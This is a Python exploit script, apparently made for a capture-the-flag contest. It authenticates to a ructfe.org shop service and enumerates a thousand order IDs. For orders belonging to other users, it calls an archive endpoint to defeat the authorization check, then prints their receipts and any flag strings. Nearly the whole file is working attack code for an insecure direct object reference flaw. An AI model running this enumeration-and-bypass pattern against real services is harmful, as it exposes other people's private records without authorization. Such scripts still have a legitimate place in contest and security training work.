import requests
import re
from time import sleep

# Base URL
BASE_URL = "http://0-3000.cks.sa.ructfe.org"

# Credentials
USERNAME = "<dummy_username>"
PASSWORD = "<dummy_password>"

def authenticate():
    """Perform two-step authentication flow"""
    session = requests.Session()
    
    # Step 1: Submit username to get user_id
    print("[*] Step 1: Submitting username to get user_id...")
    resp1 = session.post(
        f"{BASE_URL}/login",
        data={"username": USERNAME},
        allow_redirects=False
    )
    print(f"[+] Status: {resp1.status_code}")
    
    # Extract user_id from response
    user_id_match = re.search(r'user_id["\s:=]+(\d+)', resp1.text)
    if not user_id_match:
        print(f"[-] Failed to extract user_id from response")
        print(f"Response: {resp1.text[:500]}")
        return None
    
    user_id = user_id_match.group(1)
    print(f"[+] Extracted user_id: {user_id}")
    
    # Step 2: Submit password with user_id
    print("[*] Step 2: Submitting password with user_id...")
    resp2 = session.post(
        f"{BASE_URL}/login",
        data={"user_id": user_id, "password": PASSWORD},
        allow_redirects=False
    )
    print(f"[+] Status: {resp2.status_code}")
    print(f"[+] Cookies: {dict(session.cookies)}")
    
    if resp2.status_code in [200, 302]:
        print("[+] Authentication successful!")
        return session
    else:
        print(f"[-] Authentication failed")
        print(f"Response: {resp2.text[:500]}")
        return None

def check_receipt(session, order_id):
    """Check if receipt is accessible for given order ID"""
    resp = session.get(
        f"{BASE_URL}/order/{order_id}/receipt",
        allow_redirects=False
    )
    return resp

def archive_order(session, order_id):
    """Attempt to archive order"""
    resp = session.get(
        f"{BASE_URL}/order/{order_id}/archive",
        allow_redirects=False
    )
    return resp

def main():
    # Authenticate
    session = authenticate()
    if not session:
        print("[-] Authentication failed, exiting")
        return
    
    print("\n" + "="*80)
    print("STARTING ORDER ENUMERATION: 300000-300999")
    print("="*80 + "\n")
    
    # Results tracking
    authorized_orders = []
    unauthorized_orders = []
    non_existent_orders = []
    flags_found = []
    archived_successfully = []
    
    # Enumerate all order IDs
    for order_id in range(300000, 301000):
        # Progress indicator
        if (order_id - 300000) % 100 == 0:
            print(f"\n[PROGRESS] Testing order ID: {order_id} ({order_id - 300000}/1000)")
        
        # Check receipt access
        receipt_resp = check_receipt(session, order_id)
        
        if receipt_resp.status_code == 200:
            # Authorized - test user's order
            authorized_orders.append(order_id)
            print(f"[200 AUTHORIZED] Order {order_id}")
            
            # Check for flags
            flags = re.findall(r'FLAG\{[^}]+\}', receipt_resp.text)
            if flags:
                for flag in flags:
                    print(f"[!!! FLAG FOUND !!!] Order {order_id}: {flag}")
                    flags_found.append((order_id, flag))
            
        elif receipt_resp.status_code == 401:
            # Unauthorized but exists - other user's order
            unauthorized_orders.append(order_id)
            print(f"[401 UNAUTHORIZED] Order {order_id} - attempting archive...")
            
            # Attempt to archive
            archive_resp = archive_order(session, order_id)
            print(f"  Archive response: {archive_resp.status_code}")
            
            if archive_resp.status_code == 200:
                # Retry receipt after archiving
                sleep(0.1)  # Brief pause
                retry_resp = check_receipt(session, order_id)
                print(f"  Retry receipt: {retry_resp.status_code}")
                
                if retry_resp.status_code == 200:
                    archived_successfully.append(order_id)
                    print(f"[!!! ACCESS GRANTED !!!] Order {order_id} accessible after archive")
                    
                    # Check for flags
                    flags = re.findall(r'FLAG\{[^}]+\}', retry_resp.text)
                    if flags:
                        for flag in flags:
                            print(f"[!!! FLAG FOUND !!!] Order {order_id}: {flag}")
                            flags_found.append((order_id, flag))
                    
                    # Print receipt content
                    print(f"  Receipt content:\n{retry_resp.text}\n")
        
        elif receipt_resp.status_code == 404:
            # Order doesn't exist
            non_existent_orders.append(order_id)
        
        else:
            # Unexpected status
            print(f"[UNEXPECTED {receipt_resp.status_code}] Order {order_id}")
    
    # Final summary
    print("\n" + "="*80)
    print("ENUMERATION COMPLETE - FINAL SUMMARY")
    print("="*80)
    print(f"\nTotal orders tested: 1000 (300000-300999)")
    print(f"\nAuthorized orders (200): {len(authorized_orders)}")
    if authorized_orders:
        print(f"  Order IDs: {authorized_orders}")
    
    print(f"\nUnauthorized orders (401): {len(unauthorized_orders)}")
    if unauthorized_orders:
        print(f"  Order IDs: {unauthorized_orders[:50]}{'...' if len(unauthorized_orders) > 50 else ''}")
    
    print(f"\nNon-existent orders (404): {len(non_existent_orders)}")
    
    print(f"\nArchived successfully (gained access): {len(archived_successfully)}")
    if archived_successfully:
        print(f"  Order IDs: {archived_successfully}")
    
    print(f"\n{'='*80}")
    print(f"FLAGS FOUND: {len(flags_found)}")
    print(f"{'='*80}")
    if flags_found:
        for order_id, flag in flags_found:
            print(f"Order {order_id}: {flag}")
    else:
        print("No flags found")
    print("="*80)

if __name__ == "__main__":
    main()

